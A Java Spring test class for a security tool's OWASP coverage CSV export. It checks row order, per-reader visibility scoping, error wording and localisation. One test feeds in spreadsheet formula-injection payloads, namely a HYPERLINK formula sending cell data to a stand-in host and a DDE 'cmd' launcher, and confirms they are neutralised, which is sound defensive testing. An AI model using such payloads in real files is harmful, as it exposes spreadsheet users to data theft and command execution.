package com.asmolabs.vectispire.core.api;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.put;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import com.asmolabs.vectispire.common.domain.access.VisibilityMode;
import com.asmolabs.vectispire.common.domain.issues.FindingType;
import com.asmolabs.vectispire.common.domain.issues.IssueState;
import com.asmolabs.vectispire.common.domain.issues.Severity;
import com.asmolabs.vectispire.common.domain.issues.TriageStatus;
import com.asmolabs.vectispire.common.domain.scans.ScanStatus;
import com.asmolabs.vectispire.common.domain.settings.Setting;
import com.asmolabs.vectispire.core.issues.persistence.IssueEntity;
import com.asmolabs.vectispire.core.issues.persistence.IssueRepository;
import com.asmolabs.vectispire.core.scanning.persistence.ScanEntity;
import com.asmolabs.vectispire.core.scanning.persistence.ScanRepository;
import com.asmolabs.vectispire.core.settings.SettingsService;
import com.asmolabs.vectispire.core.targets.persistence.GitRepositoryRepository;
import com.asmolabs.vectispire.core.targets.persistence.RepositoryEntity;
import com.fasterxml.jackson.databind.JsonNode;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MvcResult;

/**
 * {@code GET /api/v1/owasp/coverage/export.csv}: the grid written down, under the grid's own lock.
 *
 * <p>What an auditor's sheet depends on: ten rows in the standard's order whatever the scope, the counts
 * of the targets the reader sees and no other's, a hidden project refused in the words an absent one is,
 * the reason in the language asked for, and no cell a spreadsheet would evaluate.
 */
@DisplayName("the OWASP coverage grid as CSV")
class OwaspCoverageCsvRoutesTest extends ApiTestBase {

    private static final String EXPORT = "/api/v1/owasp/coverage/export.csv";

    @Autowired
    private GitRepositoryRepository repositories;

    @Autowired
    private IssueRepository issues;

    @Autowired
    private ScanRepository scans;

    @Autowired
    private SettingsService settings;

    @Test
    @DisplayName("ten rows in the standard's order, CRLF-terminated, an attachment named by the scope's kind and number")
    void tenRowsInOrder() throws Exception {
        long solution = solution("payments");
        long project = project(solution, "api");
        long repository = repository();
        file(project, repository);
        scan(repository);
        issue(repository, FindingType.VULNERABILITY);
        issue(repository, FindingType.VULNERABILITY);

        MvcResult result = mvc.perform(authenticated(get(EXPORT + "?project_id=" + project), asAdmin()))
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Disposition",
                        "attachment; filename=\"vectispire-owasp-coverage-project-" + project + ".csv\""))
                .andReturn();
        assertThat(result.getResponse().getContentType()).startsWith("text/csv");
        String body = result.getResponse().getContentAsString(StandardCharsets.UTF_8);
        assertThat(body).endsWith("\r\n");

        List<List<String>> rows = rows(body);
        assertThat(rows).hasSize(11);
        assertThat(rows.getFirst()).startsWith("category", "title", "state", "findings", "reason_code", "reason");
        assertThat(rows.subList(1, 11).stream().map(List::getFirst))
                .containsExactly("A01", "A02", "A03", "A04", "A05", "A06", "A07", "A08", "A09", "A10");
        List<String> a06 = row(rows, "A06");
        assertThat(cell(rows, a06, "state")).isEqualTo("FINDINGS");
        assertThat(cell(rows, a06, "findings")).isEqualTo("2");
        assertThat(cell(rows, a06, "scope_kind")).isEqualTo("project");
        assertThat(cell(rows, a06, "scope_id")).isEqualTo(String.valueOf(project));
        assertThat(cell(rows, a06, "scope_name")).isEqualTo("api");
        assertThat(cell(rows, a06, "scope_partial")).isEqualTo("false");

        mvc.perform(authenticated(get(EXPORT), asAdmin()))
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Disposition", "attachment; filename=\"vectispire-owasp-coverage.csv\""));
    }

    @Test
    @DisplayName("a restricted reader's file counts their targets only — over the estate and over a project seen in part")
    void aRestrictedReaderCountsTheirOwn() throws Exception {
        long solution = solution("shop");
        long project = project(solution, "web");
        long mine = repository();
        long theirs = repository();
        file(project, mine);
        file(project, theirs);
        scan(mine);
        scan(theirs);
        issue(mine, FindingType.VULNERABILITY);
        issue(theirs, FindingType.VULNERABILITY);
        issue(theirs, FindingType.VULNERABILITY);
        issue(theirs, FindingType.VULNERABILITY);
        settings.set(Setting.TARGET_VISIBILITY, VisibilityMode.ASSIGNED.wireName());
        String reader = asReader();
        grant(readerId(), List.of(mine));

        List<List<String>> estate = rows(csv("", reader));
        assertThat(cell(estate, row(estate, "A06"), "findings")).as("the reader's one vulnerability").isEqualTo("1");
        assertThat(cell(estate, row(estate, "A06"), "scope_kind")).isEqualTo("estate");

        List<List<String>> partial = rows(csv("project_id=" + project, reader));
        assertThat(cell(partial, row(partial, "A06"), "findings")).isEqualTo("1");
        assertThat(cell(partial, row(partial, "A06"), "scope_partial")).isEqualTo("true");

        List<List<String>> whole = rows(csv("project_id=" + project, asAdmin()));
        assertThat(cell(whole, row(whole, "A06"), "findings")).as("the narrowing is the reader's").isEqualTo("4");
    }

    @Test
    @DisplayName("a hidden project answers 404 in the words an absent one does, and two scopes answer 400")
    void scopeRefusals() throws Exception {
        long solution = solution("elsewhere");
        long secret = project(solution, "secret");
        long secretRepository = repository();
        file(secret, secretRepository);
        long visible = repository();
        settings.set(Setting.TARGET_VISIBILITY, VisibilityMode.ASSIGNED.wireName());
        String reader = asReader();
        grant(readerId(), List.of(visible));

        String hidden = detailOf(mvc.perform(authenticated(get(EXPORT + "?project_id=" + secret), reader))
                .andExpect(status().isNotFound()).andReturn());
        String absent = detailOf(mvc.perform(authenticated(get(EXPORT + "?project_id=" + Long.MAX_VALUE), reader))
                .andExpect(status().isNotFound()).andReturn());
        assertThat(hidden).isEqualTo(absent).isEqualTo("Project not found.");

        assertThat(detailOf(mvc.perform(authenticated(
                                get(EXPORT + "?project_id=" + secret + "&solution_id=" + solution), asAdmin()))
                        .andExpect(status().isBadRequest()).andReturn()))
                .isEqualTo("Name a project or a solution, not both.");
    }

    @Test
    @DisplayName("the reason is written in the language asked for, and a language the interface is not read in is refused")
    void theReasonFollowsTheLanguage() throws Exception {
        long repository = repository();
        scan(repository);
        issue(repository, FindingType.VULNERABILITY);

        List<List<String>> english = rows(csv("language=en", asAdmin()));
        List<List<String>> french = rows(csv("language=fr", asAdmin()));
        assertThat(cell(english, row(english, "A06"), "reason")).isEqualTo("Open findings placed here by rule.");
        assertThat(cell(french, row(french, "A06"), "reason")).isEqualTo("Des constats ouverts sont placés ici par règle.");
        assertThat(cell(french, row(french, "A06"), "reason_code"))
                .as("the code is the same in both").isEqualTo(cell(english, row(english, "A06"), "reason_code"));
        assertThat(rows(csv("", asAdmin()))).as("English by default").isEqualTo(english);

        assertThat(detailOf(mvc.perform(authenticated(get(EXPORT + "?language=de"), asAdmin()))
                        .andExpect(status().isBadRequest()).andReturn()))
                .isEqualTo("language must be one of en, fr.");
    }

    @Test
    @DisplayName("a scope name and a declaration that read as formulas are written as text")
    void formulasAreNeutralized() throws Exception {
        long solution = solution("ledger");
        long project = project(solution, "=HYPERLINK(\"https://example.invalid/?\"&A1,\"x\")");
        file(project, repository());
        mvc.perform(authenticated(put("/api/v1/owasp/coverage/A04/declaration"), asAdmin())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(write(Map.of(
                                "applicability", "APPLICABLE",
                                "justification", "+cmd|'/c calc'!A1",
                                "implementation", "IMPLEMENTED",
                                "evidence_source", "EXTERNAL",
                                "external_evidence", "@SUM(1+1)",
                                "owner", "-security lead"))))
                .andExpect(status().isOk());

        String body = csv("project_id=" + project, asAdmin());
        List<List<String>> rows = rows(body);
        List<String> a04 = row(rows, "A04");
        assertThat(cell(rows, a04, "scope_name")).isEqualTo("'=HYPERLINK(\"https://example.invalid/?\"&A1,\"x\")");
        assertThat(cell(rows, a04, "declaration_justification")).isEqualTo("'+cmd|'/c calc'!A1");
        assertThat(cell(rows, a04, "declaration_external_evidence")).isEqualTo("'@SUM(1+1)");
        assertThat(cell(rows, a04, "declaration_owner")).isEqualTo("'-security lead");
        assertThat(cell(rows, a04, "declaration_applicability")).isEqualTo("APPLICABLE");
        assertThat(body).as("no cell opens on a formula character").doesNotContain(",\"=", ",\"+", ",\"@", ",\"-");
    }

    // ------------------------------------------------------------------------------ reading the file

    private String csv(String query, String token) throws Exception {
        return mvc.perform(authenticated(get(EXPORT + "?" + query), token))
                .andExpect(status().isOk())
                .andReturn().getResponse().getContentAsString(StandardCharsets.UTF_8);
    }

    /** RFC 4180, as the export writes it: every cell quoted, quotes doubled, rows ending in CRLF. */
    private static List<List<String>> rows(String body) {
        List<List<String>> rows = new ArrayList<>();
        List<String> row = new ArrayList<>();
        StringBuilder cell = new StringBuilder();
        boolean quoted = false;
        for (int i = 0; i < body.length(); i++) {
            char c = body.charAt(i);
            if (quoted) {
                if (c == '"' && i + 1 < body.length() && body.charAt(i + 1) == '"') {
                    cell.append('"');
                    i++;
                } else if (c == '"') {
                    quoted = false;
                } else {
                    cell.append(c);
                }
            } else if (c == '"') {
                quoted = true;
            } else if (c == ',') {
                row.add(cell.toString());
                cell.setLength(0);
            } else if (c == '\r' && i + 1 < body.length() && body.charAt(i + 1) == '\n') {
                row.add(cell.toString());
                cell.setLength(0);
                rows.add(row);
                row = new ArrayList<>();
                i++;
            } else {
                cell.append(c);
            }
        }
        return rows;
    }

    private static List<String> row(List<List<String>> rows, String category) {
        return rows.stream().skip(1).filter(row -> row.getFirst().equals(category)).findFirst().orElseThrow();
    }

    private static String cell(List<List<String>> rows, List<String> row, String column) {
        int index = rows.getFirst().indexOf(column);
        assertThat(index).as("column " + column + " in " + Arrays.toString(rows.getFirst().toArray())).isNotNegative();
        return row.get(index);
    }

    // ------------------------------------------------------------------------------ fixtures

    private long solution(String name) throws Exception {
        return idOf(mvc.perform(authenticated(post("/api/v1/solutions"), asAdmin())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(write(Map.of("name", name + "-" + System.nanoTime()))))
                .andExpect(status().isCreated())
                .andReturn().getResponse().getContentAsString());
    }

    private long project(long solution, String name) throws Exception {
        return idOf(mvc.perform(authenticated(post("/api/v1/solutions/" + solution + "/projects"), asAdmin())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(write(Map.of("name", name))))
                .andExpect(status().isCreated())
                .andReturn().getResponse().getContentAsString());
    }

    private void file(long project, long repository) throws Exception {
        mvc.perform(authenticated(put("/api/v1/projects/" + project + "/repositories/" + repository), asAdmin()))
                .andExpect(status().isNoContent());
    }

    private void grant(long userId, List<Long> targets) throws Exception {
        mvc.perform(authenticated(put("/api/v1/users/" + userId + "/targets"), asAdmin())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(write(targets.stream().map(id -> Map.of("kind", "repository", "id", id)).toList())))
                .andExpect(status().isOk());
    }

    private long idOf(String body) throws Exception {
        return json.readTree(body).path("id").asLong();
    }

    /** The reader account's identifier, read back through the administration listing. */
    private long readerId() throws Exception {
        String body = mvc.perform(authenticated(get("/api/v1/users"), asAdmin()))
                .andReturn().getResponse().getContentAsString();
        for (JsonNode node : json.readTree(body).path("users")) {
            if (node.path("username").asText("").startsWith("reader-")) {
                return node.path("id").asLong();
            }
        }
        throw new IllegalStateException("no reader account in the listing");
    }

    private long repository() {
        RepositoryEntity repository = new RepositoryEntity();
        repository.setUrl("https://example.invalid/owasp-csv-" + System.nanoTime() + ".git");
        repository.setBranch("main");
        return repositories.save(repository).getId();
    }

    private void scan(long repoId) {
        ScanEntity scan = new ScanEntity();
        scan.setRepoId(repoId);
        scan.setStatus(ScanStatus.COMPLETED.wireName());
        scan.setExaminedTypes("vulnerability,secret,iac,license,eol,sast");
        scan.setDetectedLanguages("java");
        scan.setSastLanguages("java");
        scan.setBranch("main");
        scan.setCreatedAt(Instant.now().minusSeconds(7200));
        scans.save(scan);
    }

    private void issue(long repoId, FindingType type) {
        Instant seen = Instant.now().minusSeconds(3600);
        IssueEntity issue = new IssueEntity();
        issue.setRepoId(repoId);
        issue.setFingerprint("fp-" + System.nanoTime());
        issue.setType(type.wireName());
        issue.setIdentifier("rule-" + System.nanoTime());
        issue.setSeverity(Severity.HIGH.wireName());
        issue.setState(IssueState.OPEN.wireName());
        issue.setTriageStatus(TriageStatus.UNDER_REVIEW.wireName());
        issue.setFirstSeenAt(seen);
        issue.setLastSeenAt(seen);
        issue.setTimesSeen(1);
        issues.save(issue);
    }
}
